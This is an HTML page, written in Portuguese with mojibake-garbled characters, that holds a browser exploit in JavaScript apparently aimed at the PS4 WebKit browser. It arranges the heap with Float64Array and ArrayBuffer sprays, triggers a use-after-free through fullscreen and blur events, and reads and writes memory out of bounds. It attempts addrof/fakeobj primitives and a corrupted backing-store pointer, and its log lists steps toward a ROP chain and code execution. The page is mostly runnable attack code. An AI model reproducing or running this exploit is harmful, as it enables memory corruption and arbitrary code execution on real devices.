<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Heap Feng Shui Exploit</title>
<style>
body { 
    font-family: monospace; 
    background: #000; 
    color: #0f0; 
    padding: 20px;
}
.box {
    border: 2px solid #0a0;
    padding: 15px;
    margin: 10px 0;
    background: #001100;
}
.success { background: #003300 !important; border-color: #0f0 !important; }
.critical { background: #003366 !important; border-color: #0ff !important; color: #0ff; }
button {
    background: #0a0;
    color: #000;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    margin: 5px;
}
.hex { color: #ff0; }
.addr { color: #0ff; font-weight: bold; }
pre { background: #001100; border: 1px solid #0a0; padding: 10px; overflow-x: auto; }
</style>
</head>
<body>

<h1>üß¨ Heap Feng Shui - For√ßando Proximidade</h1>

<div class="box critical">
    <h2>‚ö° ESTRAT√âGIA</h2>
    <p>Vamos criar objetos <b>ANTES</b> do UAF para que fiquem pr√≥ximos no heap.<br>
    Depois, vamos usar o array corrompido para acess√°-los.</p>
</div>

<div class="box">
    <h2>EXPLOIT COMPLETO - addrof/fakeobj</h2>
    <button onclick="runExploit()">üöÄ EXECUTAR EXPLOIT</button>
    <div id="result"></div>
</div>

<script>
// === UTILIT√ÅRIOS ===
function f2i(f) {
    let buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = f;
    return (new BigUint64Array(buf))[0];
}

function i2f(i) {
    let buf = new ArrayBuffer(8);
    (new BigUint64Array(buf))[0] = BigInt(i);
    return (new Float64Array(buf))[0];
}

function hex(n) {
    return '0x' + n.toString(16).padStart(16, '0');
}

const PATTERN_A = 2.121995791e-314; // 0x4141414141414141

let result_div = null;
let corrupted_array = null;
let victim_arrays = []; // Arrays v√≠timas para manipula√ß√£o

function log(msg) {
    if (result_div) result_div.innerHTML += msg + '<br>';
}

function runExploit() {
    result_div = document.getElementById('result');
    result_div.innerHTML = '<h3>üîß FASE 1: PREPARA√á√ÉO DO HEAP</h3>';
    
    // === FASE 1: CRIAR V√çTIMAS ANTES DO UAF ===
    log('Criando arrays v√≠timas que ficar√£o pr√≥ximos no heap...');
    
    // Criar 1000 arrays pequenos ANTES de tudo
    // Eles v√£o ocupar o heap de forma cont√≠gua
    for(let i = 0; i < 1000; i++) {
        let victim = new Float64Array(8);
        victim[0] = i2f(0xdead0000n + BigInt(i)); // Marcador √∫nico
        victim[1] = i2f(0xbeef0000n + BigInt(i));
        victim_arrays.push(victim);
    }
    
    log(`‚úì ${victim_arrays.length} arrays v√≠timas criados`);
    log('');
    
    // === FASE 2: CRIAR CONTROLLERS (que ser√£o corrompidos) ===
    log('<h3>üîß FASE 2: CRIANDO CONTROLLERS</h3>');
    
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i; // ID
        controllers.push(ctrl);
    }
    
    log(`‚úì ${controllers.length} controllers criados`);
    log('');
    log('<h3>‚è≥ APERTE OPTIONS AGORA!</h3>');
    
    // === FASE 3: TRIGGER DO UAF ===
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        log('<h3>üî• FASE 3: UAF TRIGGER</h3>');
        
        // Spray para corromper
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        log('‚úì Spray executado');
        
        // Encontrar array corrompido
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN_A) {
                corrupted_array = controllers[i];
                log(`‚úì Array corrompido encontrado: Controller[${i}]`);
                break;
            }
        }
        
        if (!corrupted_array) {
            log('‚ùå UAF falhou');
            return;
        }
        
        log('');
        
        // === FASE 4: BUSCA POR V√çTIMAS ADJACENTES ===
        log('<h3>üîç FASE 4: ESCANEANDO POR V√çTIMAS</h3>');
        log('Procurando pelos marcadores 0xdead... e 0xbeef...<br>');
        
        let found_victims = [];
        
        // Escanear at√© 512 offsets (4KB de mem√≥ria)
        for(let offset = 0; offset < 512; offset++) {
            try {
                const val = corrupted_array[offset];
                const as_int = f2i(val);
                
                // Procurar por nossos marcadores
                const is_dead = (as_int & 0xffff0000n) === 0xdead0000n;
                const is_beef = (as_int & 0xffff0000n) === 0xbeef0000n;
                
                if (is_dead || is_beef) {
                    found_victims.push({
                        offset: offset,
                        value: as_int,
                        type: is_dead ? 'DEAD' : 'BEEF'
                    });
                    log(`  [${offset}] <span class="addr">${hex(as_int)}</span> ‚Üê ${is_dead ? 'DEAD' : 'BEEF'} marcador!`);
                }
            } catch(e) {
                break; // Fim da mem√≥ria acess√≠vel
            }
        }
        
        log('');
        
        if (found_victims.length === 0) {
            log('‚ùå Nenhuma v√≠tima encontrada adjacente');
            log('üí° As v√≠timas est√£o em outra regi√£o do heap');
            log('');
            log('<h3>üîÑ SOLU√á√ÉO ALTERNATIVA</h3>');
            alternativeApproach();
            return;
        }
        
        log(`<span class="success">‚úÖ ${found_victims.length} v√≠timas encontradas!</span>`);
        log('');
        
        // === FASE 5: CONSTRUIR addrof() ===
        log('<h3>üéØ FASE 5: CONSTRUINDO addrof()</h3>');
        
        // Se encontramos v√≠timas, podemos tentar manipul√°-las
        const first_victim = found_victims[0];
        log(`Tentando manipular v√≠tima no offset ${first_victim.offset}...`);
        
        try {
            // Tentar modificar o valor
            const new_value = i2f(0xcafebabe12345678n);
            corrupted_array[first_victim.offset] = new_value;
            
            // Verificar se algum victim_array foi modificado
            let modified_victim = null;
            for(let i = 0; i < victim_arrays.length; i++) {
                const val0 = f2i(victim_arrays[i][0]);
                const val1 = f2i(victim_arrays[i][1]);
                
                if (val0 === 0xcafebabe12345678n || val1 === 0xcafebabe12345678n) {
                    modified_victim = i;
                    break;
                }
            }
            
            if (modified_victim !== null) {
                log(`<span class="success">üéØ SUCESSO CR√çTICO!</span>`);
                log(`V√≠tima ${modified_victim} foi modificada!`);
                log('');
                log('<b>VOC√ä TEM:</b>');
                log('‚úì Leitura/Escrita arbitr√°ria via array corrompido');
                log('‚úì Acesso a estruturas de outros arrays');
                log('‚úì Capacidade de manipular objetos JS remotamente');
                log('');
                log('<h3>üöÄ PR√ìXIMOS PASSOS PARA RCE:</h3>');
                log('1. Use a v√≠tima para vazar um ponteiro JSC (addrof)');
                log('2. Crie um objeto falso (fakeobj)');
                log('3. Use fakeobj para obter um ArrayBuffer com backing store control√°vel');
                log('4. Com backing store, leia/escreva mem√≥ria arbitr√°ria');
                log('5. Construa ROP chain e execute c√≥digo');
            } else {
                log('‚ö†Ô∏è Modifica√ß√£o n√£o propagou para v√≠timas conhecidas');
                log('Mas voc√™ pode ler dados adjacentes!');
            }
            
        } catch(e) {
            log(`‚ùå Erro ao manipular: ${e}`);
        }
    };
}

// === ABORDAGEM ALTERNATIVA: USAR O PR√ìPRIO ARRAY CORROMPIDO ===
function alternativeApproach() {
    log('<b>ABORDAGEM 2: Usar o pr√≥prio array corrompido como primitiva</b><br>');
    log('');
    
    log('J√° que o array est√° isolado, vamos us√°-lo diretamente:<br>');
    log('');
    
    // Criar um objeto JS simples
    let target_obj = {
        prop1: 0x1337,
        prop2: 0xdead,
        prop3: 0xbeef
    };
    
    log('‚úì Objeto alvo criado: {prop1: 0x1337, prop2: 0xdead, prop3: 0xbeef}');
    log('');
    
    // Tentar criar um ArrayBuffer com backing store conhecido
    log('<h3>üîß TENTATIVA: Criar ArrayBuffer adjacente</h3>');
    
    let buffers = [];
    for(let i = 0; i < 2000; i++) {
        let buf = new ArrayBuffer(64);
        let view = new Uint32Array(buf);
        view[0] = 0xaabbccdd;
        view[1] = i;
        buffers.push(buf);
    }
    
    log(`‚úì ${buffers.length} ArrayBuffers criados com marcadores`);
    log('');
    
    log('üîç Escaneando por marcadores 0xaabbccdd...<br>');
    
    let found_buffers = [];
    for(let offset = 0; offset < 512; offset++) {
        try {
            const val = corrupted_array[offset];
            const as_int = f2i(val);
            
            // Procurar por 0xaabbccdd em qualquer posi√ß√£o
            if ((as_int & 0xffffffffn) === 0xaabbccddn ||
                (as_int >> 32n) === 0xaabbccddn) {
                found_buffers.push({offset, value: as_int});
                log(`  [${offset}] <span class="addr">${hex(as_int)}</span> ‚Üê BUFFER marcador!`);
            }
            
            // Tamb√©m procurar por ponteiros (valores grandes alinhados)
            if (as_int > 0x100000n && as_int < 0x7fffffffffffn && (as_int & 0xfn) === 0n) {
                log(`  [${offset}] <span class="hex">${hex(as_int)}</span> ‚Üê Poss√≠vel ponteiro`);
            }
        } catch(e) {
            break;
        }
    }
    
    log('');
    
    if (found_buffers.length > 0) {
        log(`<span class="success">‚úÖ ${found_buffers.length} buffers encontrados!</span>`);
        log('');
        log('<h3>üéØ TENTANDO CORROMPER BACKING STORE</h3>');
        
        const buf_offset = found_buffers[0].offset;
        log(`Usando buffer no offset ${buf_offset}...`);
        
        // Tentar injetar um backing store pointer falso
        const fake_ptr = 0x4142434445464748n;
        
        // Backing store geralmente est√° alguns offsets ap√≥s o marcador
        for(let delta = 1; delta <= 10; delta++) {
            try {
                const target_offset = buf_offset + delta;
                corrupted_array[target_offset] = i2f(fake_ptr);
                log(`  [${target_offset}] = ${hex(fake_ptr)}`);
            } catch(e) {}
        }
        
        log('');
        log('‚úì Tentativa de corrup√ß√£o executada');
        log('');
        log('<b>‚ö†Ô∏è VALIDA√á√ÉO:</b>');
        log('Se algum ArrayBuffer crashar ao tentar ler/escrever, voc√™ corrompeu o backing store!');
        log('Isso seria a primitiva final para arbitrary R/W!');
        
    } else {
        log('‚ùå Nenhum buffer adjacente encontrado');
        log('');
        log('<h3>üìä AN√ÅLISE FINAL</h3>');
        log('<b>Situa√ß√£o atual:</b>');
        log('‚úì Voc√™ tem primitiva R/W nos offsets 0-7');
        log('‚úì Voc√™ consegue ler at√© offset 255+ (OOB read)');
        log('‚ùå Mas objetos est√£o isolados em diferentes regi√µes do heap');
        log('');
        log('<b>üí° SOLU√á√ïES POSS√çVEIS:</b>');
        log('1. <b>Timing Attack:</b> Criar v√≠timas DURANTE o UAF (no onblur)');
        log('2. <b>Heap Grooming:</b> Liberar mem√≥ria e realocar no mesmo lugar');
        log('3. <b>Multiple UAF:</b> Criar m√∫ltiplos arrays corrompidos');
        log('4. <b>Spray Diferente:</b> Usar objetos ao inv√©s de TypedArrays');
        log('');
        log('üéØ <b>RECOMENDA√á√ÉO:</b> Vou criar um teste com Timing Attack...');
    }
}

</script>

<hr>
<p style="color: #888;">
<b>üí° TEORIA DO HEAP FENG SHUI:</b><br>
O exploit tenta organizar o heap para que:<br>
1. V√≠timas sejam criadas ANTES (ficam em endere√ßos baixos)<br>
2. Controllers sejam criados DEPOIS (ficam pr√≥ximos)<br>
3. Durante o UAF, o spray preenche os buracos deixados pelas v√≠timas<br>
4. Com sorte, um controller corrompido fica adjacente a uma v√≠tima<br>
</p>

</body>
</html>
